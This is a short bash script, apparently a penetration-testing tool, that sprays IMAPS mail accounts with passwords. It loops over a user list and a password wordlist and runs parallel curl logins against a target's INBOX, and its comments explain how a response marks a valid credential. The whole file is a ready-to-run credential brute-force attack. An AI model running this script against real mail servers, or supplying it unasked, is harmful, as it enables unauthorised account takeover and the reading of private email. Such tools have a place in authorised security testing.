#! /bin/bash

# This script is used to spray imaps accounts with passwords from a wordlist.
# If anything but the username:password combination return, (I.E. '* LIST') the credentials above the value should be valid.
# Inspired by this page from Hacktricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap

# Check for correct number of arguments, exit if 3 aren't provided.

if [ $# -ne 3 ]; then
        echo "Usage: imapspray.sh <IP> <userlist> <wordlist>"
        exit 1
fi

while IFS= read -r I; do
    while IFS= read -r J; do
        {
            echo "$I:$J"
            curl -k "imaps://$1/INBOX" --user "$I:$J" 2>/dev/null
        } &
    done < <(cat "$3")

    wait
done < "$2"
